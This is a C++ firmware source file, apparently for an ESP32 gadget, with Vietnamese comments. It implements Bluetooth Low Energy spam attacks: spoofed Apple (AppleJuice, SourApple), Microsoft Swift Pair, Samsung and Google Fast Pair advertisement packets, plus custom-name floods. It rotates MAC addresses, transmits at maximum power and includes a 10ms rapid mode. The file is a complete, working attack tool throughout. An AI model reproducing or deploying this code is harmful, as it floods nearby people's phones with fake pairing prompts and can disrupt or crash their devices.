#include "ble_spam.h"
#include "core/Translation.h" // Thêm include Translation
#include "core/display.h"
#include "core/mykeyboard.h"
#include <Arduino.h>
#include <NimBLEBeacon.h>
#include <NimBLEDevice.h>
#include <globals.h>
#include <vector>

// ==========================================================================
// ⚙️ CẤU HÌNH TỐC ĐỘ
// ==========================================================================
int g_speed_mode = 2; // 0=FAST

// Hàm trả về Delay Loop (Thời gian nghỉ giữa các lần đổi MAC)
int getLoopDelay() {
    if (g_speed_mode == 0) return 10;  // FAST: 10ms (Spam gắt)
    if (g_speed_mode == 1) return 500; // MEDIUM: 500ms (Ổn định)
    return 1000;                       // SLOW: 1 giây (Bền bỉ)
}

void toggleSpamSpeed() {
    g_speed_mode++;
    if (g_speed_mode > 2) g_speed_mode = 0;
}

#if defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P21
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9
#endif

static NimBLEAdvertising *pAdvertising = nullptr;
static bool is_ble_initialized = false;

// ==========================================================================
// KHO DỮ LIỆU (FULL KHÔNG CẮT BỚT)
// ==========================================================================
const uint8_t APPLE_DEVICES[] = {
    0x02,
    0x0F,
    0x13,
    0x0E,
    0x14,
    0x0A,
    0x17,
    0x16,
    0x03,
    0x0B,
    0x0C,
    0x11,
    0x10,
    0x05,
    0x06,
    0x09,
    0x12,
    0x19,
    0x1E
};

const uint8_t APPLE_ACTIONS[] = {
    0x09, 0x02, 0x0D, 0x13, 0x27, 0x20, 0x19, 0x30, 0x0B, 0x2B, 0x01, 0x06, 0x24, 0x05, 0x1B
};

struct DeviceType {
    uint32_t value;
};
// Danh sách Android đầy đủ
const DeviceType android_models[] = {
    {0x0001F0}, {0x000047}, {0x470000}, {0x00000A}, {0x00000B}, {0x00000D}, {0x000007}, {0x000009},
    {0x090000}, {0x000048}, {0x001000}, {0x00B727}, {0x01E5CE}, {0x0200F0}, {0x00F7D4}, {0xF00002},
    {0xF00400}, {0x1E89A7}, {0xCD8256}, {0x0000F0}, {0xF00000}, {0x821F66}, {0xF52494}, {0x718FA4},
    {0x0002F0}, {0x92BBBD}, {0x000006}, {0x060000}, {0xD446A7}, {0x038B91}, {0x02F637}, {0x02D886},
    {0xF00001}, {0xF00201}, {0xF00209}, {0xF00205}, {0xF00305}, {0xF00E97}, {0x04ACFC}, {0x04AA91},
    {0x04AFB8}, {0x05A963}, {0x05AA91}, {0x05C452}, {0x05C95C}, {0x0602F0}, {0x0603F0}, {0x1E8B18},
    {0x1E955B}, {0x1EC95C}, {0x06AE20}, {0x06C197}, {0x06C95C}, {0x06D8FC}, {0x0744B6}, {0x07A41C},
    {0x07C95C}, {0x07F426}, {0x0102F0}, {0x054B2D}, {0x0660D7}, {0x0103F0}, {0x0903F0}, {0xD99CA1},
    {0x77FF67}, {0xAA187F}, {0xDCE9EA}, {0x87B25F}, {0x1448C9}, {0x13B39D}, {0x7C6CDB}, {0x005EF9},
    {0xE2106F}, {0xB37A62}, {0x92ADC9}
};
const int android_models_count = sizeof(android_models) / sizeof(android_models[0]);

struct WatchModel {
    uint8_t value;
};
const WatchModel watch_models[] = {{0x1A}, {0x01}, {0x02}, {0x03}, {0x04}, {0x05}, {0x06}, {0x07}, {0x08},
                                   {0x09}, {0x0A}, {0x0B}, {0x0C}, {0x11}, {0x12}, {0x13}, {0x14}, {0x15},
                                   {0x16}, {0x17}, {0x18}, {0x1B}, {0x1C}, {0x1D}, {0x1E}, {0x20}};
const int watch_models_count = sizeof(watch_models) / sizeof(watch_models[0]);

// ==========================================================================
// HÀM HỖ TRỢ
// ==========================================================================

String generateRandomName() {
    String res = "";
    const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    int len = random(5, 12);
    for (int i = 0; i < len; ++i) res += charset[random(0, 52)];
    return res;
}

void setFastRandomMac() {
    uint8_t mac[6];
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)random(0, 256);
    mac[0] &= 0xFE; // Giả lập Public Address
    NimBLEDevice::setOwnAddr(mac);
}

// ==========================================================================
// PAYLOAD GENERATOR (ANTI-CACHE / SALT)
// ==========================================================================
NimBLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
    NimBLEAdvertisementData AdvData;
    switch (Type) {
        case Microsoft: {
            String Name = generateRandomName();
            uint8_t name_len = Name.length();
            uint8_t buffer[30];
            buffer[0] = 6 + name_len;
            buffer[1] = 0xFF;
            buffer[2] = 0x06;
            buffer[3] = 0x00;
            buffer[4] = 0x03;
            buffer[5] = 0x00;
            buffer[6] = 0x80;
            memcpy(&buffer[7], Name.c_str(), name_len);
            AdvData.addData(buffer, 7 + name_len);
            break;
        }
        case AppleJuice: {
            uint8_t device = APPLE_DEVICES[random(sizeof(APPLE_DEVICES))];
            uint8_t packet[31] = {
                0x1e,
                0xff,
                0x4c,
                0x00,
                0x07,
                0x19,
                0x07,
                device,
                0x20,
                0x75,
                0xaa,
                0x30,
                0x01,
                0x00,
                0x00,
                0x45,
                0x12,
                0x12,
                0x12,
                0x00,
                (uint8_t)random(256),
                (uint8_t)random(256),
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00
            };
            packet[20] = (uint8_t)random(0, 100);
            AdvData.addData(packet, 31);
            break;
        }
        case SourApple: {
            uint8_t action = APPLE_ACTIONS[random(sizeof(APPLE_ACTIONS))];
            uint8_t packet[17];
            int i = 0;
            packet[i++] = 16;
            packet[i++] = 0xFF;
            packet[i++] = 0x4C;
            packet[i++] = 0x00;
            packet[i++] = 0x0F;
            packet[i++] = 0x05;
            packet[i++] = 0xC1;
            packet[i++] = action;
            packet[i++] = (uint8_t)random(256);
            packet[i++] = (uint8_t)random(256);
            packet[i++] = (uint8_t)random(256);
            packet[i++] = 0x00;
            packet[i++] = 0x00;
            packet[i++] = 0x10;
            packet[i++] = (uint8_t)random(256);
            AdvData.addData(packet, 17);
            break;
        }
        case Samsung: {
            uint8_t model = watch_models[random(26)].value;
            uint8_t data[15] = {
                0x0F,
                0xFF,
                0x75,
                0x00,
                0x01,
                0x00,
                0x02,
                0x00,
                0x01,
                0x01,
                0xFF,
                0x00,
                0x00,
                0x43,
                (uint8_t)((model >> 0x00) & 0xFF)
            };
            data[13] = (uint8_t)random(256); // Salt
            AdvData.addData(data, 15);
            break;
        }
        case Google: {
            uint32_t model = android_models[random() % android_models_count].value;
            uint8_t data[14] = {
                0x03,
                0x03,
                0x2C,
                0xFE,
                0x06,
                0x16,
                0x2C,
                0xFE,
                (uint8_t)((model >> 16) & 0xFF),
                (uint8_t)((model >> 8) & 0xFF),
                (uint8_t)((model >> 0) & 0xFF),
                0x02,
                0x0A,
                (uint8_t)((random() % 120) - 100)
            };
            AdvData.addData(data, 14);
            break;
        }
    }
    return AdvData;
}

// ==========================================================================
// SPAM ENGINE
// ==========================================================================

void executeSpamCycle(EBLEPayloadType type) {
    if (pAdvertising->isAdvertising()) { pAdvertising->stop(); }
    setFastRandomMac();
    pAdvertising->setAdvertisementData(GetUniversalAdvertisementData(type));
    pAdvertising->setMinInterval(0x20);
    pAdvertising->setMaxInterval(0x20);
    pAdvertising->start();
}

void executeCustomSpam(String spamName) {
    if (pAdvertising->isAdvertising()) pAdvertising->stop();
    NimBLEDevice::deinit(true);
    delay(10);
    NimBLEDevice::init(spamName.c_str());
    NimBLEDevice::setPower(MAX_TX_POWER);
    pAdvertising = NimBLEDevice::getAdvertising();
    setFastRandomMac();

    NimBLEAdvertisementData advData;
    advData.setFlags(0x06);
    advData.setName(spamName.c_str());
    advData.setCompleteServices(NimBLEUUID("1812"));
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();
}

// ==========================================================================
// IBEACON
// ==========================================================================
void ibeacon(const char *DeviceName, const char *BEACON_UUID, int ManufacturerId) {
    NimBLEDevice::deinit(true);
    delay(50);
    NimBLEDevice::init(DeviceName);
    NimBLEDevice::setPower(MAX_TX_POWER);
    pAdvertising = NimBLEDevice::getAdvertising();
    setFastRandomMac();

    NimBLEBeacon myBeacon;
    myBeacon.setManufacturerId(0x4c00);
    myBeacon.setMajor(5);
    myBeacon.setMinor(88);
    myBeacon.setSignalPower(0xc5);
    myBeacon.setProximityUUID(NimBLEUUID(BEACON_UUID));

    NimBLEAdvertisementData advData;
    advData.setFlags(0x1A);
    advData.setManufacturerData(myBeacon.getData());
    pAdvertising->setAdvertisementData(advData);

    drawMainBorderWithTitle(Translation::tr("iBeacon").c_str());
    padprintln("");
    padprintln(Translation::tr("UUID:") + String(BEACON_UUID));
    padprintln(Translation::tr("Press Any key to STOP."));

    pAdvertising->start();
    while (!check(AnyKeyPress)) delay(100);
    pAdvertising->stop();
    NimBLEDevice::deinit(true);
    is_ble_initialized = false;
}

// ==========================================================================
// MAIN LOOP + SMART DELAY
// ==========================================================================

void aj_adv(int ble_choice) {
    int mael = 0;
    unsigned long packet_count = 0;
    unsigned long last_update = 0;
    String customName = "";

    if (ble_choice == 6) {
        customName = keyboard("", 15, Translation::tr("Name to spam").c_str());
        if (customName == "") return;
    }

    if (!is_ble_initialized || ble_choice == 6) {
        if (ble_choice == 6) NimBLEDevice::deinit(true);
        NimBLEDevice::init("X-Cube");
        NimBLEDevice::setPower(MAX_TX_POWER);
        pAdvertising = NimBLEDevice::getAdvertising();
        is_ble_initialized = true;
    }

    String modeName = Translation::tr("FAST (10ms)");
    if (g_speed_mode == 1) modeName = Translation::tr("MED (0.5s)");
    if (g_speed_mode == 2) modeName = Translation::tr("SLOW (1s)");

    drawMainBorderWithTitle(Translation::tr("BLE SPAM [") + modeName + "]");
    padprintln(Translation::tr("Press ESC to Stop"));

    bool stop_flag = false;

    while (!stop_flag) {
        switch (ble_choice) {
            case 0: executeSpamCycle(AppleJuice); break;
            case 1: executeSpamCycle(SourApple); break;
            case 2: executeSpamCycle(Microsoft); break;
            case 3: executeSpamCycle(Samsung); break;
            case 4: executeSpamCycle(Google); break;
            case 5: // Tutti-frutti
                if (mael == 0) executeSpamCycle(Google);
                else if (mael == 1) executeSpamCycle(Samsung);
                else if (mael == 2) executeSpamCycle(Microsoft);
                else if (mael == 3) executeSpamCycle(SourApple);
                else if (mael == 4) {
                    executeSpamCycle(AppleJuice);
                    mael = -1;
                }
                mael++;
                break;
            case 6: executeCustomSpam(customName); break;
        }

        packet_count++;
        if (millis() - last_update > 250) {
            displayTextLine(Translation::tr("Sent: ") + String(packet_count));
            last_update = millis();
        }

        if (ble_choice != 6) {
            int waitTime = getLoopDelay();
            unsigned long startWait = millis();
            while (millis() - startWait < waitTime) {
                if (check(EscPress)) {
                    stop_flag = true;
                    break;
                }
                delay(10);
            }
        } else {
            if (check(EscPress)) stop_flag = true;
        }

        if (stop_flag) break;
    }

    if (pAdvertising->isAdvertising()) pAdvertising->stop();
    displayTextLine(Translation::tr("Stopped."));
    delay(500);
}

void executeSpam(EBLEPayloadType type) {
    if (!is_ble_initialized) {
        NimBLEDevice::init("Spam");
        NimBLEDevice::setPower(MAX_TX_POWER);
        pAdvertising = NimBLEDevice::getAdvertising();
        is_ble_initialized = true;
    }
    executeSpamCycle(type);
    delay(getLoopDelay());
}
